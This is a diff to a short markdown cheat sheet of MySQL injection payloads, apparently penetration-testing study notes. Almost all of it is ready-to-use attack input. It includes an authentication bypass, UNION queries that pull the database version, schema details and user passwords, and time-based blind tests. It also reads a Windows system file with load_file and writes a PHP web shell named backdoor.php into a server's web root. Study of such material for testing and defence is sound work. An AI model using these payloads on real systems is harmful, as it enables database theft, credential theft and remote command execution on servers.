@@ -1,20 +1,25 @@
-### Identifying SQL Injection Vulnerabilities
+### Mysql
+###### Identifying SQL Injection Vulnerabilities
 ```
 select * from users where name = 'tom' or 1=1;#' and password = 'jones';
 ```
 
-### Authentication Bypass
+###### UNION-based Payloads
+source code: $query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
 ```
-Some programming languages have functions that query the database and expect a single record. If these functions get more than one row, they will generate an error
-select * from users where name = 'tom' or 1=1 LIMIT 1;#
-
-source-code:$sql = "SELECT id, name, text FROM feedback WHERE id=". $_GET['id'];
-http://url/debug.php?id=1+UNION+SELECT+id,username,password,flag,time+FROM+users
-http://10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables
-http://10.11.0.22/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
+' ORDER BY 1-- //
+%' UNION SELECT database(), user(), @@version, null, null -- //
+' UNION SELECT null, null, database(), user(), @@version  -- //
+' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
+' UNION SELECT null, username, password, description, null FROM users -- //
+```
+###### Blind Sql
+```
+offsec' AND 1=1 -- //
+offsec' AND IF (1=1, sleep(3),'false') -- //
 ```
 
-### From SQL Injection to Code Execution
+###### From SQL Injection to Code Execution
 ```
 http://10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
 http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
